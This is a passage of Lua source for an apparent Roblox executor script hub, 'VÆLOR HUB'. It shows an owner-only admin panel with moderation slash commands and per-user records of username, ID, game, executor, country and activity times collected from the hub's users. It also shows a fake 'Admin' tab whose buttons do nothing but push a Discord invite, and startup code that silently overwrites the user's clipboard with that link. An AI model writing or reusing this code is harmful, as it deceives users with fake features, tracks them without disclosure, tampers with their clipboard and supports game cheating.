		local user, sec = rest:match("^(%S+)%s*(%S*)$")
		ragdollUser(user or "", sec)
	end
	extraCommands.unragdoll = function(rest)
		targetCmd("unragdoll", rest, nil, "Un-ragdolled")
	end
	extraCommands.dm = function(rest)
		local user, text = rest:match("^(%S+)%s+(.+)$")
		if not user then
			error("Use: /dm <user> <message>")
		end
		dmUser(user, text)
	end
	extraCommands.msg = function(rest)
		sendMsg(rest)
	end
	extraCommands.poll = function(rest)
		startPoll(rest, 30)
	end
	extraCommands.viplist = function()
		showList("vip")
	end
	extraCommands.mutelist = function()
		showList("mute")
	end
	extraCommands.banlist = function()
		showList("ban")
	end

	extraCommands.cmds = function()
		Loader:Notify({
			Title = "Admin Commands",
			Content = "/give vip, /remove vip, /announce, /giveaway, /call, /mute, /unmute, /ban, /unban, /kick, /warn, /bring, /clearchat, /slowmode, /freeze, /unfreeze, /kill, /sit, /ragdoll, /unragdoll, /jail, /unjail, /respawn, /rejoin, /dm, /msg, /poll, /viplist, /mutelist, /banlist, /party, /fireworks, /disco, /mega, /countdown, /bigtext, /coin, /dice, /emoji, /tag, /stats, /lookup",
			Type = "Info",
			Duration = 12,
			Force = true,
		})
	end

	adminTab = adminTabs.Stats
	adminTab:CreateSection({ Text = "Hub Stats" })
	local totalStat = adminTab:CreateStat({ Name = "Total users", Value = "-" })
	local onlineStat = adminTab:CreateStat({ Name = "Online now", Value = "-" })
	local todayStat = adminTab:CreateStat({ Name = "Active last 24h", Value = "-" })
	local execStat = adminTab:CreateStat({ Name = "Total executions", Value = "-" })
	local gameStat = adminTab:CreateStat({ Name = "Top game", Value = "-" })
	local exStat = adminTab:CreateStat({ Name = "Top executor", Value = "-" })

	adminTab:CreateButton({
		Name = "Refresh Stats",
		Description = "Loads the numbers above from the database",
		ButtonText = "Refresh",
		Callback = function()
			local data = loadUsers()
			local now = os.time()
			local total, online, today, execs = 0, 0, 0, 0
			local games, executors = {}, {}
			for _, u in pairs(data) do
				if type(u) == "table" then
					total += 1
					local last = tonumber(u.last) or 0
					if u.state == "online" and now - last < 600 then
						online += 1
					end
					if now - last < 86400 then
						today += 1
					end
					execs += tonumber(u.execs) or 0
					local g = tostring(u.gameName or u.gameId or "?")
					games[g] = (games[g] or 0) + 1
					local e = tostring(u.executor or "?")
					executors[e] = (executors[e] or 0) + 1
				end
			end
			totalStat:SetValue(tostring(total), theme.Success)
			onlineStat:SetValue(tostring(online), theme.Success)
			todayStat:SetValue(tostring(today))
			execStat:SetValue(tostring(execs))
			gameStat:SetValue(topOf(games))
			exStat:SetValue(topOf(executors))
		end,
	})

	adminTab:CreateSection({ Text = "User Lookup" })
	local lookupBox = adminTab:CreateTextbox({ Name = "Username", Placeholder = "Roblox username" })
	local lookupResult = adminTab:CreateParagraph({ Text = "Type a username and press Look up." })
	adminTab:CreateButton({
		Name = "Look up",
		ButtonText = "Look up",
		Callback = function()
			local query = validUser(lookupBox:GetText())
			local found
			for _, u in pairs(loadUsers()) do
				if type(u) == "table" and string.lower(tostring(u.name or "")) == query then
					found = u
					break
				end
			end
			if not found then
				lookupResult:SetText("No data for " .. query .. ".")
				return
			end
			local online = found.state == "online" and os.time() - (tonumber(found.last) or 0) < 600
			lookupResult:SetText(table.concat({
				"Username: " .. tostring(found.name) .. " (ID " .. tostring(found.uid) .. ")",
				"Game: " .. tostring(found.gameName or found.gameId or "?"),
				"Executor: " .. tostring(found.executor or "?") .. "   Hub: " .. tostring(found.version or "?"),
				"Executions: " .. tostring(found.execs or 0),
				"Country: " .. fmtCountry(found.country),
				"State: " .. (online and "Online" or "Offline"),
				"First seen: " .. fmtDate(found.first),
				"Last seen: " .. fmtDate(found.last),
			}, "\n"), theme.Text)
		end,
	})
end

-- The "Game Support" tab automatically lists the IDs above (no duplicate registration).

--==================================================================================================
-- ADMIN TAB (fake / display only) - created last so it is the final tab.
-- Every button only shows the Discord notification and does nothing else.
--==================================================================================================
do
	local AdminTab = Loader:CreateTab("Admin")

	local function adminNotice()
		Loader:Notify({
			Title = "ADMIN",
			Content = "JOIN DISCORD TO GET ADMIN ACCESS",
			Type = "Warning",
			Duration = 4,
			Force = true,
		})
	end

	AdminTab:CreateSection({ Text = "Admin" })

	-- Fake target selector (does nothing)
	AdminTab:CreateDropdown({
		Name = "Target Player",
		Options = function()
			local list = {}
			for _, p in ipairs(game:GetService("Players"):GetPlayers()) do
				table.insert(list, p.Name)
			end
			return list
		end,
		Callback = function()
			adminNotice()
		end,
	})

	local function fakeButton(name)
		AdminTab:CreateButton({
			Name = name,
			ButtonText = ">",
			Callback = adminNotice,
		})
	end

	fakeButton("Update List")
	fakeButton("BAN")
	fakeButton("KICK")
	fakeButton("BAN ALL")
	fakeButton("KICK ALL")
	fakeButton("KILL")
	fakeButton("KILL ALL")
	fakeButton("EXPLODE ALL")
	fakeButton("JAIL")
	fakeButton("UNJAIL")
	fakeButton("JAIL ALL")
	fakeButton("UNJAIL ALL")
	fakeButton("RAGDOLL")
	fakeButton("UNRAGDOLL")
	fakeButton("KILLPLUS")
	fakeButton("BACKROOMS")
	fakeButton("UNBACKROOMS")
	fakeButton("JUMPSCARE")
	fakeButton("ANNOUNCE")
	fakeButton("VERIFY")
end


Loader:Notify({
	Title = "VÆLOR HUB",
	Content = "Loader loaded successfully!",
	Type = "Success",
	Duration = 3,
})

-- Restore last tab (optional) + startup tasks ----------------------------------------------------
if Config:Get("rememberTab", false) then
	local lastKey = Config:Get("lastTab")
	local lastTab = lastKey and Loader:FindTabByKey(lastKey)
	if lastTab then
		Loader:SelectTab(lastTab, true)
	end
end

Loader:Log("Hub loaded (v" .. HUB_VERSION .. ")", "Success")
task.spawn(checkForUpdates, false)

-- Welcome + Discord ---------------------------------------------------------
task.spawn(function()
	local StarterGui = game:GetService("StarterGui")
	local discord = DISCORD_LINK

	if setclipboard and Config:Get("copyDiscord", true) then
		pcall(setclipboard, discord)
	end

	pcall(function()
		StarterGui:SetCore("SendNotification", {
			Title = "ᴠÆʟᴏʀ",
			Text = "welcome to ᴠÆʟᴏʀ !!, Join discord to get more features",
			Duration = 30,
		})
	end)
end)

